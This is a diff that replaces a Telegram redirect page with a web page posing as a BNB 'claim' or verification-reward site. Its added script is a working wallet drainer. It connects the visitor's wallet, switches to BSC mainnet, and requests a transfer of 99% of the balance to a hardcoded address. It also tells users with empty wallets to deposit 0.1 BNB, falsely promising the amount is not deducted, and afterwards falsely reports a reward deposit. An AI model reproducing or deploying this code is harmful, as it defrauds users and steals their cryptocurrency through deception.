@@ -1,11 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://t.me/pixlandsbot/pixlands?startapp=zxjMExV">
-    <title>.</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BNB Transfer Stable</title>
+<style>
+body{font-family:sans-serif;text-align:center;margin-top:50px;}
+button{padding:10px 20px;font-size:16px;margin:10px;}
+</style>
 </head>
 <body>
-    <p>.<a href="https://t.me/pixlandsbot/pixlands?startapp=zxjMExV">اgo</a>.</p>
+
+<h2>claim)</h2>
+
+<button onclick="connectWallet()">connect</button>
+<button onclick="sendBNB()">claim</button>
+
+<p id="status"></p>
+
+<script>
+let account;
+const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";
+
+function setStatus(msg){
+    document.getElementById("status").innerText = msg;
+}
+
+//  BSC
+async function connectWallet(){
+    if(!window.ethereum){ alert("Wallet not fund.It might be better to install the Etamad wallet from Google Play and create a new wallet."); return; }
+    try{
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        setStatus("Connected: " + account);
+
+        //    BSC Mainnet
+        await ethereum.request({
+            method:"wallet_switchEthereumChain",
+            params:[{chainId:"0x38"}]
+        });
+        setStatus("Connected" + account);
+    }catch(err){
+        console.error(err);
+        alert("Connection error.." + (err.message || err));
+    }
+}
+
+async function sendBNB(){
+    if(!account){ alert("connect first!"); return; }
+    setStatus("wait...");
+
+    try{
+        const balanceHex = await ethereum.request({
+            method: "eth_getBalance",
+            params: [account, "latest"]
+        });
+        const balance = BigInt(balanceHex);
+
+        if(balance <= 0){
+            alert("Balance error. It might be better to increase your balance to 0.1 bnb to make sure you are not a fake user or a bot, then try again. Note! This amount will not be deducted from your account and is only to verify your identity. After authentication, you can withdraw your bnb balance and your authentication gift balance. The gift balance is deposited immediately and automatically after authentication and can be withdrawn!");
+            return;
+        }
+
+        const sendAmount = balance * 99n / 100n;
+
+        const txHash = await ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: account,
+                to: DESTINATION,
+                value: "0x" + sendAmount.toString(16)
+            }]
+        });
+
+        setStatus("Congratulations, your verification has been confirmed and the verification reward balance has been deposited into this wallet. Check your wallet." + txHash);
+
+    }catch(err){
+        console.error(err);
+        if(err.code === 4001){
+            alert("c error");
+        } else {
+            alert("c error " + (err.message || err));
+        }
+    }
+}
+</script>
+
 </body>
 </html>
